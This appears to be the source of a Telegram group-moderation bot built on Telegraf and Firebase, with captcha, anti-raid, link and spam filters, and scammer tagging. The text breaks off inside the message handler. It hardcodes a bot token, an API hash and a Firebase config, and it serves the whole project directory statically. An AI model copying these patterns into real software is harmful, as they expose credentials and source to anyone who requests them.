const express = require('express');
const cors = require('cors');
const { Telegraf, Markup } = require('telegraf');
const { TelegramClient, Api } = require('telegram');
const { StringSession } = require('telegram/sessions');
const { computeCheck } = require('telegram/Password');
const path = require('path');
const fs = require('fs');
const crypto = require('crypto');

// =============================================================================
// FIREBASE REALTIME DATABASE CONFIGURATION
// =============================================================================
const firebase = require('firebase/compat/app');
require('firebase/compat/database');

const firebaseConfig = {
    apiKey: "AIzaSyBkL3ObqERCiDBuyXz4lr3Y7PYxzxt4hqA",
    authDomain: "vsprotection1.firebaseapp.com",
    databaseURL: "https://vsprotection1-default-rtdb.firebaseio.com",
    projectId: "vsprotection1",
    storageBucket: "vsprotection1.firebasestorage.app",
    messagingSenderId: "635122514754",
    appId: "1:635122514754:web:893417281989495d9066db"
};

if (!firebase.apps.length) {
    firebase.initializeApp(firebaseConfig);
}
const db = firebase.database();

// =============================================================================
// APP & BOT CREDENTIALS
// =============================================================================
const BOT_TOKEN = process.env.BOT_TOKEN || "8590481969:AAF9l54_V5P2lHuk_kvVA1VnucYWMGRY1gk";
let BOT_USERNAME = "Vareonprotection_bot";
const API_ID = parseInt(process.env.API_ID || "39447470");
const API_HASH = process.env.API_HASH || "eb7cac1c8ad9935d4b208dc0da076d8c";
const PORT = process.env.PORT || 3000;

const app = express();
app.use(cors());
app.use(express.json());

app.use(express.static(path.join(__dirname, 'public')));
app.use(express.static(__dirname));

app.get('/ping', (req, res) => res.status(200).send("OK - VS Protection Master Engine Active"));

app.get('/admin', (req, res) => {
    const p1 = path.join(__dirname, 'public', 'admin.html');
    const p2 = path.join(__dirname, 'admin.html');
    if (fs.existsSync(p1)) return res.sendFile(p1);
    if (fs.existsSync(p2)) return res.sendFile(p2);
    res.status(404).send("<h2>admin.html not found.</h2>");
});

// =============================================================================
// GLOBAL MULTI-LANGUAGE / COUNTRY PRESET REPOSITORY
// =============================================================================
const GLOBAL_LOCALES = {
    en: {
        antiLink: "⚠️ {mention}, external links are restricted in {chat}!",
        emojiSpam: "⚠️ {mention}, excessive emojis are prohibited! ({count}/{limit})",
        antiForward: "⚠️ {mention}, forwarded messages are not allowed!",
        antiButton: "⚠️ {mention}, messages containing interactive bot buttons are prohibited!",
        imageSpam: "⚠️ {mention}, sharing media/images is restricted!",
        banMsg: "⛔ {name} has been permanently removed from {chat}.",
        lockMsg: "🔒 *This conversation has been temporarily muted by community administrators.*",
        badWords: "⚠️ {mention}, inappropriate language is prohibited! Warnings: ({warns}/{warn_limit})",
        welcome: "👋 Welcome {mention} to {chat}! Please follow community guidelines.",
        goodbye: "👋 Goodbye {name}! We hope to see you again.",
        antiRaid: "🚨 *[RAID INTERCEPTED]* SMM Bot account automatically purged: {name}",
        captchaMsg: "👋 Hello {name}!\nTo verify you are a genuine human, please solve: *{n1} + {n2} = ?*"
    },
    bn: {
        antiLink: "⚠️ {mention}, আমাদের {chat} গ্রুপে কোনো প্রকার লিংক শেয়ার করা নিষেধ!",
        emojiSpam: "⚠️ {mention}, অতিরিক্ত ইমোজি পাঠানো এই গ্রুপে নিষেধ! ({count}/{limit})",
        antiForward: "⚠️ {mention}, কোনো মেসেজ ফরোয়ার্ড করে পাঠানো এখানে নিষেধ!",
        antiButton: "⚠️ {mention}, ইনলাইন বাটনযুক্ত মেসেজ পাঠানো নিষিদ্ধ!",
        imageSpam: "⚠️ {mention}, এই কমিউনিটিতে ছবি বা মিডিয়া ফাইল পাঠানো সীমাবদ্ধ!",
        banMsg: "⛔ {name} কে নিয়মলঙ্ঘনের দায়ে {chat} থেকে ব্যান করা হয়েছে।",
        lockMsg: "🔒 *গ্রুপ অ্যাডমিন কর্তৃক চ্যাট সাময়িকভাবে লক (মিউট) করা হয়েছে।*",
        badWords: "⚠️ {mention}, অশালীন ভাষা ব্যবহার করবেন না! সতর্কতা: ({warns}/{warn_limit})",
        welcome: "👋 স্বাগতম {mention}! আমাদের {chat} পরিবারে আপনাকে শুভেচ্ছা।",
        goodbye: "👋 বিদায় {name}! ভালো থাকবেন।",
        antiRaid: "🚨 *[বট রেইড শনাক্ত]* এসএমএম প্যানেলের ফেক মেম্বার রিমুভ করা হয়েছে: {name}",
        captchaMsg: "👋 প্রিয় {name}!\nআপনি রোবট নন প্রমাণ করতে সমাধান করুন: *{n1} + {n2} = কত?*"
    },
    hi: {
        antiLink: "⚠️ {mention}, {chat} में बाहरी लिंक भेजना सख्त मना है!",
        emojiSpam: "⚠️ {mention}, अत्यधिक इमोजी का उपयोग प्रतिबंधित है! ({count}/{limit})",
        antiForward: "⚠️ {mention}, फॉरवर्ड किए गए मैसेज की अनुमति नहीं है!",
        antiButton: "⚠️ {mention}, बॉट बटन वाले मैसेज ब्लॉक कर दिए गए हैं!",
        imageSpam: "⚠️ {mention}, मीडिया और तस्वीरें भेजना प्रतिबंधित है!",
        banMsg: "⛔ {name} को {chat} से निष्कासित कर दिया गया है।",
        lockMsg: "🔒 *एडमिन द्वारा चैट को कुछ समय के लिए म्यूट कर दिया गया है।*",
        badWords: "⚠️ {mention}, अभद्र भाषा का प्रयोग न करें! चेतावनी: ({warns}/{warn_limit})",
        welcome: "👋 {chat} में आपका स्वागत है {mention}!",
        goodbye: "👋 अलविदा {name}!",
        antiRaid: "🚨 *[रेड अलर्ट]* बॉट सदस्यों को स्वतः हटा दिया गया: {name}",
        captchaMsg: "👋 नमस्ते {name}!\nप्रमाणित करें कि आप बॉट नहीं हैं: *{n1} + {n2} = ?*"
    },
    ar: {
        antiLink: "⚠️ {mention}، يمنع نشر الروابط الخارجية في {chat}!",
        emojiSpam: "⚠️ {mention}، استخدام الرموز التعبيرية بكثرة ممنوع! ({count}/{limit})",
        antiForward: "⚠️ {mention}، إعادة توجيه الرسائل غير مسموح بها هنا!",
        antiButton: "⚠️ {mention}، الرسائل التي تحتوي على أزرار محظورة!",
        imageSpam: "⚠️ {mention}، إرسال الوسائط مقيد في هذه المجموعة!",
        banMsg: "⛔ تم حظر {name} نهائيًا من {chat}.",
        lockMsg: "🔒 *تم قفل المحادثة مؤقتًا بواسطة المسؤولين.*",
        badWords: "⚠️ {mention}، يُمنع استخدام الكلمات غير اللائقة! تحذير: ({warns}/{warn_limit})",
        welcome: "👋 أهلاً بك {mention} في {chat}!",
        goodbye: "👋 وداعاً {name}!",
        antiRaid: "🚨 *[هجوم بوتات]* تم طرد الحساب الوهمي بنجاح: {name}",
        captchaMsg: "👋 مرحباً {name}!\nلإثبات أنك لست روبوتًا، أجب: *{n1} + {n2} = ?*"
    },
    ru: {
        antiLink: "⚠️ {mention}, внешние ссылки в {chat} запрещены!",
        emojiSpam: "⚠️ {mention}, спам эмодзи запрещен! ({count}/{limit})",
        antiForward: "⚠️ {mention}, пересылка сообщений запрещена!",
        antiButton: "⚠️ {mention}, кнопки ботов заблокированы!",
        imageSpam: "⚠️ {mention}, отправка медиафайлов ограничена!",
        banMsg: "⛔ {name} был навсегда заблокирован в {chat}.",
        lockMsg: "🔒 *Чат временно закрыт администратором.*",
        badWords: "⚠️ {mention}, ненормативная лексика запрещена! Предупреждения: ({warns}/{warn_limit})",
        welcome: "👋 Добро пожаловать, {mention}, в {chat}!",
        goodbye: "👋 До свидания, {name}!",
        antiRaid: "🚨 *[Анти-Рейд]* Бот удален из канала: {name}",
        captchaMsg: "👋 Привет, {name}!\nДокажите, что вы человек: *{n1} + {n2} = ?*"
    }
};

function resolveLocalizedText(settings, eventKey, userLangCode, params = {}) {
    // ১. অ্যাডমিনের নিজস্ব কাস্টম টেক্সট থাকলে
    if (settings[eventKey] && typeof settings[eventKey].msg === 'string' && settings[eventKey].msg.trim()) {
        return formatTemplate(settings[eventKey].msg, params);
    }
    if (settings[eventKey] && typeof settings[eventKey].text === 'string' && settings[eventKey].text.trim()) {
        return formatTemplate(settings[eventKey].text, params);
    }

    // ২. গ্রুপের নির্বাচিত ভাষা অথবা ইউজারের দেশ/ভাষা
    let lang = settings.preferredLanguage || 'auto';
    if (lang === 'auto') {
        lang = (userLangCode || 'en').slice(0, 2).toLowerCase();
    }

    const dict = GLOBAL_LOCALES[lang] || GLOBAL_LOCALES.en;
    const template = dict[eventKey] || GLOBAL_LOCALES.en[eventKey] || "";
    return formatTemplate(template, params);
}

function formatTemplate(template, p) {
    return template
        .replace(/{mention}/g, p.mention || p.name || 'Member')
        .replace(/{user}/g, p.mention || p.name || 'Member')
        .replace(/{name}/g, p.name || 'Member')
        .replace(/{username}/g, p.username || p.name || 'Member')
        .replace(/{chat}/g, p.chat || 'Community')
        .replace(/{count}/g, p.count || '0')
        .replace(/{limit}/g, p.limit || '0')
        .replace(/{warns}/g, p.warns || '0')
        .replace(/{warn_limit}/g, p.warnLimit || '3')
        .replace(/{n1}/g, p.n1 || '0')
        .replace(/{n2}/g, p.n2 || '0');
}

// =============================================================================
// SUBSCRIPTION CHECKER WITH AUTO RECOVERY
// =============================================================================
let subscriptionCache = {};

async function isChatSubscriptionActive(chatId, ctx = null) {
    const now = Date.now();
    if (subscriptionCache[chatId] && (now - subscriptionCache[chatId].cachedAt < 20000)) {
        return subscriptionCache[chatId].isActive;
    }

    try {
        let ownerSnap = await db.ref(`groups/${chatId}/merged_owner`).once('value');
        let ownerTgId = ownerSnap.val();

        if (!ownerTgId && ctx) {
            try {
                const admins = await ctx.getChatAdministrators();
                const creator = admins.find(a => a.status === 'creator');
                if (creator && creator.user) {
                    ownerTgId = creator.user.id.toString();
                    await db.ref(`groups/${chatId}/merged_owner`).set(ownerTgId);
                }
            } catch (e) {}
        }

        let sub = null;
        if (ownerTgId) {
            const subSnap = await db.ref(`subscriptions/${ownerTgId}`).once('value');
            sub = subSnap.val();
        }

        if (!sub) {
            const allSubsSnap = await db.ref('subscriptions/by_uid').once('value');
            const allSubs = allSubsSnap.val() || {};
            for (const k of Object.keys(allSubs)) {
                const s = allSubs[k];
                const grace = s.graceEndsAt || (s.expiresAt + 7 * 86400000);
                if (now <= grace) {
                    sub = s;
                    break;
                }
            }
        }

        if (!sub) {
            subscriptionCache[chatId] = { isActive: false, cachedAt: now };
            return false;
        }

        const graceEndsAt = sub.graceEndsAt || (sub.expiresAt + (7 * 24 * 60 * 60 * 1000));
        const isActive = now <= graceEndsAt;

        subscriptionCache[chatId] = { isActive, cachedAt: now };
        return isActive;
    } catch (e) {
        return true;
    }
}

async function getOwnerSubByChat(chatId) {
    const active = await isChatSubscriptionActive(chatId);
    if (!active) {
        return {
            hasSub: false,
            reason: "NO_ACTIVE_LICENSE",
            message: "Active subscription license required to execute this action."
        };
    }
    return { hasSub: true };
}

// =============================================================================
// TELEGRAF BOT ENGINE
// =============================================================================
const bot = new Telegraf(BOT_TOKEN);
let chatSettingsCache = {};
let botId = null;

bot.telegram.getMe().then(info => {
    botId = info.id;
    BOT_USERNAME = info.username;
    console.log(`[VS Protection] Telegraf Online: @${BOT_USERNAME} (ID: ${botId})`);
}).catch(err => {
    console.error("[VS Protection] BOT TOKEN ERROR:", err.message);
});

async function getChatSettings(chatId) {
    if (chatSettingsCache[chatId]) return chatSettingsCache[chatId];
    try {
        const snap = await db.ref(`groups/${chatId}/settings`).once('value');
        const settings = snap.val() || {
            preferredLanguage: 'auto',
            welcome: { enabled: true, photoUrl: "", text: "", buttons: [], autoDeleteSeconds: 0 },
            goodbye: { enabled: true, text: "", autoDeleteSeconds: 10 },
            morningMsg: { enabled: false, time: "08:00", text: "" },
            banSystem: { enabled: true, sendMsg: true, msg: "" },
            antiLink: { enabled: false, sendMsg: true, msg: "", autoDeleteSeconds: 5 },
            antiForward: { enabled: false, sendMsg: true, msg: "", autoDeleteSeconds: 5 },
            antiButton: { enabled: false, sendMsg: true, msg: "", autoDeleteSeconds: 5 },
            emojiSpam: { enabled: false, maxCount: 2, sendMsg: true, msg: "", autoDeleteSeconds: 5 },
            imageSpam: { enabled: false, sendMsg: true, msg: "", autoDeleteSeconds: 5 },
            badWords: { enabled: false, words: [], action: 'warn', sendMsg: true, customMsg: "", autoDeleteSeconds: 6 },
            scammerAlert: { enabled: true, msg: "" },
            nameTracker: { enabled: true },
            leaveTracker: { enabled: true },
            commands: { bio: { enabled: true, role: 'all' } },
            autoReplies: {},
            warnLimit: 3,
            chatLocked: false,
            sendLockMsg: true,
            lockMsg: "",
            antiRaid: { enabled: true, threshold: 5, action: 'kick' },
            channelCaptcha: { enabled: true }
        };
        chatSettingsCache[chatId] = settings;
        return settings;
    } catch (e) {
        return {};
    }
}

db.ref('groups').on('child_changed', (snap) => {
    const val = snap.val();
    if (val && val.settings) chatSettingsCache[snap.key] = val.settings;
});

function buildInlineButtons(buttonsArray) {
    if (!Array.isArray(buttonsArray) || buttonsArray.length === 0) return null;
    const inlineRows = [];
    buttonsArray.forEach(b => {
        if (b.text && b.url && (b.url.startsWith('http://') || b.url.startsWith('https://') || b.url.startsWith('tg://'))) {
            inlineRows.push([Markup.button.url(b.text.trim(), b.url.trim())]);
        }
    });
    return inlineRows.length > 0 ? Markup.inlineKeyboard(inlineRows) : null;
}

function countEmojis(str) {
    if (!str) return 0;
    const emojiRegex = /[\p{Extended_Pictographic}\u{1F3FB}-\u{1F3FF}\u{1F926}-\u{1F939}\u{1F1E6}-\u{1F1FF}]/gu;
    const matches = str.match(emojiRegex);
    return matches ? matches.length : 0;
}

async function getUserRole(ctx, userId) {
    try {
        const member = await ctx.getChatMember(userId);
        if (member.status === 'creator') return 'owner';
        if (member.status === 'administrator') return 'admin';
        return 'member';
    } catch (e) {
        return 'member';
    }
}

// =============================================================================
// 1. CHANNEL JOIN REQUEST + MULTILINGUAL CAPTCHA (SMM BOT DEFENSE)
// =============================================================================
bot.on('chat_join_request', async (ctx) => {
    try {
        const chatId = ctx.chat.id;
        const userId = ctx.from.id;
        const userLang = ctx.from.language_code;
        const fullName = `${ctx.from.first_name || ''} ${ctx.from.last_name || ''}`.trim() || ctx.from.first_name;

        const isSubActive = await isChatSubscriptionActive(chatId, ctx);
        if (!isSubActive) return;

        const settings = await getChatSettings(chatId);

        if (settings.channelCaptcha?.enabled !== false) {
            const n1 = Math.floor(Math.random() * 8) + 1;
            const n2 = Math.floor(Math.random() * 8) + 1;
            const ans = n1 + n2;

            const opts = [ans, ans + 2, Math.max(1, ans - 2)].sort(() => Math.random() - 0.5);
            const buttons = opts.map(o => 
                Markup.button.callback(`${o}`, `cpt_${chatId}_${userId}_${o === ans ? 'ok' : 'fl'}`)
            );

            const prompt = resolveLocalizedText(settings, 'captchaMsg', userLang, {
                name: fullName,
                n1,
                n2
            });

            await bot.telegram.sendMessage(userId, prompt, {
                parse_mode: 'Markdown',
                ...Markup.inlineKeyboard([buttons])
            }).catch(() => {
                console.log(`[Captcha] User ${userId} blocked DMs or not started bot.`);
            });
        } else {
            await ctx.approveChatJoinRequest(userId).catch(() => {});
        }
    } catch (err) {
        console.error("[Join Request Error]:", err.message);
    }
});

bot.action(/cpt_(-?\d+)_(\d+)_(ok|fl)/, async (ctx) => {
    try {
        const parts = ctx.match[0].split('_');
        const targetChatId = parts[1];
        const targetUserId = parseInt(parts[2]);
        const status = parts[3];

        if (ctx.from.id !== targetUserId) {
            return ctx.answerCbQuery("⚠️ This verification is not for your account.", { show_alert: true });
        }

        if (status === 'ok') {
            await ctx.telegram.approveChatJoinRequest(targetChatId, targetUserId);
            await ctx.editMessageText("✅ *Verification Successful!* You have been approved to join.", { parse_mode: 'Markdown' });
        } else {
            await ctx.telegram.declineChatJoinRequest(targetChatId, targetUserId);
            await ctx.editMessageText("❌ *Incorrect Answer.* Your join request was declined.", { parse_mode: 'Markdown' });
        }
    } catch (e) {
        ctx.reply("⚠️ Verification session expired. Please send join request again.").catch(() => {});
    }
});

// =============================================================================
// 2. ANTI-RAID MEMBER DETECTOR (DIRECT PUBLIC JOINS)
// =============================================================================
const joinTracker = new Map();

bot.on('chat_member', async (ctx) => {
    try {
        const chatId = ctx.chat.id;
        const newStatus = ctx.chatMember?.new_chat_member?.status;
        const oldStatus = ctx.chatMember?.old_chat_member?.status;
        const user = ctx.chatMember?.new_chat_member?.user;

        if (newStatus === 'member' && oldStatus !== 'member' && user && !user.is_bot) {
            const isSubActive = await isChatSubscriptionActive(chatId, ctx);
            if (!isSubActive) return;

            const settings = await getChatSettings(chatId);
            if (!settings.antiRaid?.enabled) return;

            const now = Date.now();
            if (!joinTracker.has(chatId)) joinTracker.set(chatId, []);

            const list = joinTracker.get(chatId).filter(t => (now - t) < 5000);
            list.push(now);
            joinTracker.set(chatId, list);

            const limit = parseInt(settings.antiRaid.threshold || 5);

            if (list.length >= limit) {
                console.log(`[SMM RAID TRIGGERED] Chat: ${chatId}, Purging: ${user.id}`);
                const action = settings.antiRaid.action || 'kick';

                if (action === 'kick') {
                    await ctx.banChatMember(user.id).catch(() => {});
                    setTimeout(() => ctx.unbanChatMember(user.id).catch(() => {}), 1500);
                } else {
                    await ctx.banChatMember(user.id).catch(() => {});
                }
            }
        }
    } catch (e) {}
});

// =============================================================================
// 3. WELCOME & GOODBYE GREETINGS
// =============================================================================
bot.on('new_chat_members', async (ctx) => {
    try {
        const chatId = ctx.chat.id;
        const isSubActive = await isChatSubscriptionActive(chatId, ctx);
        if (!isSubActive) return;

        const settings = await getChatSettings(chatId);
        if (!settings.welcome?.enabled) return;

        for (const member of ctx.message.new_chat_members) {
            if (member.is_bot) continue;

            const fullName = `${member.first_name || ''} ${member.last_name || ''}`.trim() || member.first_name;
            const userMention = `[${fullName}](tg://user?id=${member.id})`;
            const usernameTag = member.username ? `@${member.username}` : fullName;
            const userLang = member.language_code;

            const msg = resolveLocalizedText(settings, 'welcome', userLang, {
                mention: userMention,
                name: fullName,
                username: usernameTag,
                chat: ctx.chat.title || "Community"
            });

            const keyboard = buildInlineButtons(settings.welcome.buttons);
            const extra = { parse_mode: 'Markdown' };
            if (keyboard) extra.reply_markup = keyboard.reply_markup;

            let sentWelcome;
            const photoUrl = (settings.welcome.photoUrl || "").trim();

            if (photoUrl && (photoUrl.startsWith('http://') || photoUrl.startsWith('https://'))) {
                sentWelcome = await ctx.replyWithPhoto(photoUrl, { caption: msg, ...extra }).catch(async () => {
                    return await ctx.replyWithMarkdown(msg, extra).catch(() => {});
                });
            } else {
                sentWelcome = await ctx.replyWithMarkdown(msg, extra).catch(() => {});
            }

            const deleteSec = parseInt(settings.welcome.autoDeleteSeconds || 0);
            if (deleteSec > 0 && sentWelcome && sentWelcome.message_id) {
                setTimeout(() => ctx.deleteMessage(sentWelcome.message_id).catch(() => {}), deleteSec * 1000);
            }
        }
    } catch (err) {}
});

bot.on('left_chat_member', async (ctx) => {
    try {
        const chatId = ctx.chat.id;
        const user = ctx.message.left_chat_member;
        if (!user || user.is_bot) return;

        const fullName = `${user.first_name || ''} ${user.last_name || ''}`.trim() || user.first_name;
        const userMention = `[${fullName}](tg://user?id=${user.id})`;
        const usernameTag = user.username ? `@${user.username}` : fullName;

        await db.ref(`groups/${chatId}/left_members/${user.id}`).set({
            id: user.id.toString(),
            name: fullName,
            username: user.username ? `@${user.username}` : 'No username',
            timestamp: Date.now()
        });

        const isSubActive = await isChatSubscriptionActive(chatId, ctx);
        if (!isSubActive) return;

        const settings = await getChatSettings(chatId);
        if (settings.goodbye?.enabled !== false) {
            const goodbyeMsg = resolveLocalizedText(settings, 'goodbye', user.language_code, {
                mention: userMention,
                name: fullName,
                username: usernameTag,
                chat: ctx.chat.title || "Community"
            });

            const sent = await ctx.replyWithMarkdown(goodbyeMsg).catch(() => {});
            const delSec = parseInt(settings.goodbye?.autoDeleteSeconds || 10);
            if (delSec > 0 && sent && sent.message_id) {
                setTimeout(() => ctx.deleteMessage(sent.message_id).catch(() => {}), delSec * 1000);
            }
        }
    } catch (e) {}
});

// =============================================================================
// 4. CORE MODERATION ENGINE WITH REPLY TOGGLES
// =============================================================================
bot.on('message', async (ctx, next) => {
    try {
        if (!ctx.chat || ctx.chat.type === 'private') return next();

        const chatId = ctx.chat.id;
        const text = ctx.message.text || ctx.message.caption || "";

        if (text === '/ping') {
            return ctx.replyWithMarkdown(`🏓 *Pong!*\n🤖 Bot: @${BOT_USERNAME}\n⚡ Defense: *Active & Defending*`);
        }

        const isSubActive = await isChatSubscriptionActive(chatId, ctx);
        if (!isSubActive) return next();

        const userId = ctx.from?.id;
        const userLang = ctx.from?.language_code;
        const settings = await getChatSettings(chatId);
        const userRole = await getUserRole(ctx, userId);
        const isAdmin = ['owner', 'admin'].includes(userRole);

        const fullName = `${ctx.from?.first_name || ''} ${ctx.from?.last_name || ''}`.trim() || (ctx.from ? ctx.from.first_name : 'Member');
        const userMention = `[${fullName}](tg://user?id=${userId})`;
        const usernameTag = ctx.from?.username ? `@${ctx.from.username}` : fullName;

        // Name Tracker
        if (settings.nameTracker?.enabled !== false && ctx.from) {
            const userHistoryRef = db.ref(`groups/${chatId}/name_history/${userId}`);
            const snap = await userHistoryRef.once('value');
            const storedName = snap.val();

            if (storedName && storedName !== fullName) {
                ctx.replyWithMarkdown(
                    `📝 *[SECURITY: NAME CHANGE DETECTED]*\n` +
                    `User: [${fullName}](tg://user?id=${userId})\n` +
                    `🔄 *Old Name:* \`${storedName}\`\n` +
                    `✨ *New Name:* \`${fullName}\``
                ).catch(() => {});
            }
            await userHistoryRef.set(fullName);
        }

        // Scammer Tagging
        const scammerSnap = await db.ref(`groups/${chatId}/scammers/${userId}`).once('value');
        if (scammerSnap.val()) {
            const scamNotice = settings.scammerAlert?.msg || "🚨 *SECURITY ALERT: This user has been flagged as a FRAUDSTER/SCAMMER!*";
            ctx.replyWithMarkdown(scamNotice, { reply_to_message_id: ctx.message.message_id }).catch(() => {});
        }

        // Auto-Replies Engine
        if (text && settings.autoReplies && typeof settings.autoReplies === 'object') {
            const clean = text.trim().toLowerCase();
            for (const key of Object.keys(settings.autoReplies)) {
                const rule = settings.autoReplies[key];
                if (!rule || !rule.trigger || !rule.response) continue;

                const trg = rule.trigger.trim().toLowerCase();
                if (clean === trg || clean.includes(trg)) {
                    let allowed = false;
                    if (rule.target === 'everyone') allowed = true;
                    else if (rule.target === 'admin_owner' && isAdmin) allowed = true;
                    else if (rule.target === 'owner_only' && userRole === 'owner') allowed = true;

                    if (allowed) {
                        const formatted = formatTemplate(rule.response, {
                            mention: userMention,
                            name: fullName,
                            username: usernameTag,
                            chat: ctx.chat.title
                        });
                        const kb = buildInlineButtons(rule.buttons);
                        const extra = { reply_to_message_id: ctx.message.message_id, parse_mode: 'Markdown' };
                        if (kb) extra.reply_markup = kb.reply_markup;

                        ctx.reply(formatted, extra).catch(() => {});
                        break;
                    }
                }
            }
        }

        // Slash Commands
        if (text.startsWith('/')) {
            const parts = text.trim().split(/\s+/);
            const cmd = parts[0].toLowerCase().replace(`@${bot.botInfo?.username?.toLowerCase()}`, '');

            if (cmd === '/ban' && isAdmin) {
                let targetUser = ctx.message.reply_to_message?.from;
                if (!targetUser) return ctx.reply("⚠️ Reply to a user's message with `/ban`.");

                await ctx.banChatMember(targetUser.id).catch(() => {});
                const tName = `${targetUser.first_name || ''} ${targetUser.last_name || ''}`.trim() || targetUser.first_name;

                if (settings.banSystem?.sendMsg !== false) {
                    const banMsg = resolveLocalizedText(settings, 'banMsg', userLang, {
                        name: tName,
                        chat: ctx.chat.title
                    });
                    return ctx.replyWithMarkdown(banMsg);
                }
                return;
            }

            if (cmd === '/bio') {
                const bioRoleAllowed = settings.commands?.bio?.role || 'all';
                if (bioRoleAllowed === 'owner' && userRole !== 'owner') return;
                if (bioRoleAllowed === 'admin' && !isAdmin) return;

                let targetUser = ctx.message.reply_to_message?.from || ctx.from;
                const tRole = await getUserRole(ctx, targetUser.id);
                const warnSnap = await db.ref(`groups/${chatId}/warns/${targetUser.id}`).once('value');
                const isScammer = (await db.ref(`groups/${chatId}/scammers/${targetUser.id}`).once('value')).val();

                const bioMessage = 
                    `📋 *User Dossier & Security Evaluation*\n\n` +
                    `👤 *Name:* [${targetUser.first_name}](tg://user?id=${targetUser.id})\n` +
                    `🆔 *User ID:* \`${targetUser.id}\`\n` +
                    `🎖 *Assigned Role:* \`${tRole.toUpperCase()}\`\n` +
                    `⚠️ *Active Infractions:* \`${warnSnap.val() || 0}/${settings.warnLimit || 3}\`\n` +
                    `🛡 *Trust Score:* ${isScammer ? '🚨 *CONFIRMED SCAMMER*' : '✅ *Safe*'}`;

                return ctx.replyWithMarkdown(bioMessage, { reply_to_message_id: ctx.message.message_id });
            }

            if (cmd === '/scam' && isAdmin) {
                let targetUser = ctx.message.reply_to_message?.from;
                if (!targetUser) return ctx.reply("⚠️ Reply to a message with `/scam`.");

                await db.ref(`groups/${chatId}/scammers/${targetUser.id}`).set({
                    name: `${targetUser.first_name || ''} ${targetUser.last_name || ''}`.trim(),
                    username: targetUser.username || '',
                    flaggedAt: Date.now()
                });
                return ctx.replyWithMarkdown(`🚨 [${targetUser.first_name}](tg://user?id=${targetUser.id}) has been added to Scammer Blacklist.`);
            }

            if (cmd === '/unscam' && isAdmin) {
                let targetUser = ctx.message.reply_to_message?.from;
                if (!targetUser) return ctx.reply("⚠️ Reply with `/unscam`.");
                await db.ref(`groups/${chatId}/scammers/${targetUser.id}`).remove();
                return ctx.replyWithMarkdown(`✅ Cleared scam flag for [${targetUser.first_name}](tg://user?id=${targetUser.id}).`);
            }
        }

        if (isAdmin) return next();

        // 1. Chat Lock
        if (settings.chatLocked) {
            await ctx.deleteMessage().catch(() => {});
            return;
        }

        // 2. Anti-Button
        if (settings.antiButton?.enabled) {
            const hasButtons = ctx.message.reply_markup?.inline_keyboard?.length > 0;
            if (hasButtons || ctx.from.is_bot) {
                await ctx.deleteMessage().catch(() => {});
                if (settings.antiButton.sendMsg !== false) {
                    const notice = resolveLocalizedText(settings, 'antiButton', userLang, { mention: userMention, chat: ctx.chat.title });
                    ctx.replyWithMarkdown(notice).then(m => setTimeout(() => ctx.deleteMessage(m.message_id).catch(() => {}), (settings.antiButton.autoDeleteSeconds || 5) * 1000));
                }
                return;
            }
        }

        // 3. Image/Media Spam
        const isMedia = Boolean(ctx.message.photo || ctx.message.document || ctx.message.video || ctx.message.sticker);
        if (settings.imageSpam?.enabled && isMedia) {
            await ctx.deleteMessage().catch(() => {});
            if (settings.imageSpam.sendMsg !== false) {
                const notice = resolveLocalizedText(settings, 'imageSpam', userLang, { mention: userMention, chat: ctx.chat.title });
                ctx.replyWithMarkdown(notice).then(m => setTimeout(() => ctx.deleteMessage(m.message_id).catch(() => {}), (settings.imageSpam.autoDeleteSeconds || 5) * 1000));
            }
            return;
        }

        // 4. Emoji Spam
        if (settings.emojiSpam?.enabled) {
            const count = countEmojis(text);
            const max = parseInt(settings.emojiSpam.maxCount ?? 2);
            if (count > max) {
                await ctx.deleteMessage().catch(() => {});
                if (settings.emojiSpam.sendMsg !== false) {
                    const notice = resolveLocalizedText(settings, 'emojiSpam', userLang, { mention: userMention, count, limit: max, chat: ctx.chat.title });
                    const sent = await ctx.replyWithMarkdown(notice).catch(() => {});
                    const del = parseInt(settings.emojiSpam.autoDeleteSeconds || 5);
                    if (del > 0 && sent) setTimeout(() => ctx.deleteMessage(sent.message_id).catch(() => {}), del * 1000);
                }
                return;
            }
        }

        // 5. Anti-Forward
        if (settings.antiForward?.enabled && (ctx.message.forward_date || ctx.message.forward_origin)) {
            await ctx.deleteMessage().catch(() => {});
            if (settings.antiForward.sendMsg !== false) {
                const notice = resolveLocalizedText(settings, 'antiForward', userLang, { mention: userMention, chat: ctx.chat.title });
                ctx.replyWithMarkdown(notice).then(m => setTimeout(() => ctx.deleteMessage(m.message_id).catch(() => {}), (settings.antiForward.autoDeleteSeconds || 5) * 1000));
            }
            return;
        }

        // 6. Anti-Link
        if (settings.antiLink?.enabled) {
            const hasLink = /(https?:\/\/[^\s]+)|(t\.me\/[^\s]+)|(telegram\.me\/[^\s]+)/gi.test(text);
            if (hasLink) {
                await ctx.deleteMessage().catch(() => {});
                if (settings.antiLink.sendMsg !== false) {
                    const notice = resolveLocalizedText(settings, 'antiLink', userLang, { mention: userMention, chat: ctx.chat.title });
                    ctx.replyWithMarkdown(notice).then(m => setTimeout(() => ctx.deleteMessage(m.message_id).catch(() => {}), (settings.antiLink.autoDeleteSeconds || 5) * 1000));
                }
                return;
            }
        }

        // 7. Bad Words
        if (settings.badWords?.enabled && Array.isArray(settings.badWords.words)) {
            const found = settings.badWords.words.some(w => w.trim() && text.toLowerCase().includes(w.trim().toLowerCase()));
            if (found) {
                await ctx.deleteMessage().catch(() => {});
                const action = settings.badWords.action || 'warn';
                const limit = settings.warnLimit || 3;

                if (action === 'warn') {
                    const warnRef = db.ref(`groups/${chatId}/warns/${userId}`);
                    const snap = await warnRef.once('value');
                    const warns = (snap.val() || 0) + 1;
                    await warnRef.set(warns);

                    if (warns >= limit) {
                        await ctx.banChatMember(userId).catch(() => {});
                        await warnRef.remove();
                        if (settings.banSystem?.sendMsg !== false) {
                            const banMsg = resolveLocalizedText(settings, 'banMsg', userLang, { name: fullName, chat: ctx.chat.title });
                            ctx.replyWithMarkdown(banMsg).catch(() => {});
                        }
                    } else if (settings.badWords.sendMsg !== false) {
                        const notice = resolveLocalizedText(settings, 'badWords', userLang, { mention: userMention, warns, warnLimit: limit });
                        const sent = await ctx.replyWithMarkdown(notice).catch(() => {});
                        const del = parseInt(settings.badWords.autoDeleteSeconds || 6);
                        if (del > 0 && sent) setTimeout(() => ctx.deleteMessage(sent.message_id).catch(() => {}), del * 1000);
                    }
                } else if (action === 'ban') {
                    await ctx.banChatMember(userId).catch(() => {});
                    if (settings.banSystem?.sendMsg !== false) {
                        const banMsg = resolveLocalizedText(settings, 'banMsg', userLang, { name: fullName, chat: ctx.chat.title });
                        ctx.replyWithMarkdown(banMsg).catch(() => {});
                    }
                }
                return;
            }
        }

    } catch (e) {}
